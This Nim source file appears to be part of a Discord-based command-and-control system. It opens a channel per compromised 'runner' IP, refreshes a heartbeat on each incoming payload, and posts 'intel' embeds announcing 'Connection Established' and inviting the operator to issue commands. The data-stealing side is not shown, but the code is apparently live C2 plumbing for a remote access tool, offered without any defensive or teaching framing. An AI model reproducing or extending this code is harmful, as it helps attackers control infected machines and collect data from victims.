import dimscord_nossl, asyncdispatch, strutils, options, constants, times, tables

var channelCache: Table[string, GuildChannel] = initTable[string, GuildChannel]()
var pendingSetups: Table[string, Future[GuildChannel]] = initTable[string, Future[GuildChannel]]()
var lastCacheRefresh = 0.0

proc currentStamp(): string =
    (now().utc + initDuration(hours = 1)).format("yyyy-MM-dd HH:mm:ss 'CET'")

proc currentEpoch(): int64 = getTime().toUnix()

proc heartbeatTopic(): string =
    "Last Heartbeat: " & currentStamp() & " | " & $currentEpoch()

proc withRateLimitRetry[T](op: proc(): Future[T] {.closure.}, label: string): Future[T] {.async.} =
    var attempt = 0
    while true:
        try:
            return await op()
        except CatchableError as e:
            if e.msg.toLowerAscii().contains("rate-limited") and attempt < 5:
                inc attempt
                let delayMs = 1000 * attempt
                echo "[429] Rate-limited during ", label, ". Retrying in ", delayMs, "ms..."
                await sleepAsync(delayMs)
            else:
                raise

proc setupRunnerChannel*(client: DiscordClient, ipRaw: string): Future[GuildChannel] {.async.} =
    ## ipRaw is expected to be the runner IP (e.g. "192.168.1.5").
    # Replace dots with dashes for channel name and normalize
    let chanName = ipRaw
        .replace(".", "-")
        .replace(":", "-")
        .toLowerAscii()
    let guildId = TargetGuildId
    
    # Check if a setup for this channel is already in progress
    if chanName in pendingSetups:
        return await pendingSetups[chanName]

    # Use cache if fresh (last 5 mins)
    let nowTs = epochTime()
    if channelCache.len > 0 and (nowTs - lastCacheRefresh < 300.0):
        if chanName in channelCache:
            let ch = channelCache[chanName]
            # Always update topic as a heartbeat when payload is received
            try:
                discard await withRateLimitRetry(proc(): Future[GuildChannel] =
                    client.api.editGuildChannel(ch.id, topic = some(heartbeatTopic()))
                , "editGuildChannel(topic-cache)")
            except CatchableError: discard
            return ch

    # Start a new setup and track it as pending
    let fut = newFuture[GuildChannel]("setupRunnerChannel")
    pendingSetups[chanName] = fut
    
    try:
        let channels = await client.api.getGuildChannels(guildId)
        channelCache.clear()
        lastCacheRefresh = nowTs

        var targetChan: Option[GuildChannel] = none(GuildChannel)

        for ch in channels:
            if ch.name.len > 0:
                channelCache[ch.name] = ch
            if ch.name == chanName:
                targetChan = some(ch)

        if targetChan.isSome:
            let ch = targetChan.get()
            # Always update topic as a heartbeat when payload is received
            try:
                discard await withRateLimitRetry(proc(): Future[GuildChannel] =
                    client.api.editGuildChannel(ch.id, topic = some(heartbeatTopic()))
                , "editGuildChannel(topic-existing)")
            except CatchableError: discard
            fut.complete(ch)
            return ch

        # create under ActiveCategoryId with initial heartbeat topic
        let res = await withRateLimitRetry(proc(): Future[GuildChannel] =
            client.api.createGuildChannel(
                guildId,
                chanName,
                parent_id = some(ActiveCategoryId),
                topic = some(heartbeatTopic())
            )
        , "createGuildChannel")
        channelCache[chanName] = res
        fut.complete(res)
        return res
    except CatchableError as e:
        fut.fail(e)
        raise e
    finally:
        pendingSetups.del(chanName)


proc createIntelEmbed*(data: string, stamp: string = ""): Embed =
    # Build a safe-size embed (Discord total embed limit: 6000, desc limit: 4096)
    const maxDesc = 3500
    var desc = data
    if desc.len > maxDesc:
        desc = desc[0 ..< maxDesc] & "\n\n... (truncated, see attached payload.txt)"

    var footerVal: Option[EmbedFooter] = none(EmbedFooter)
    if stamp.len > 0: footerVal = some(EmbedFooter(text: stamp))

    result = Embed(
        description: some("## 🕵️ Connection Established\n" & desc & "\n### 🔗 Runner is listening to this channel.\n\tType \"`help`\" to see a list of available custom commands."),
        color: some(0xFFFFFF), # White
        footer: footerVal
    )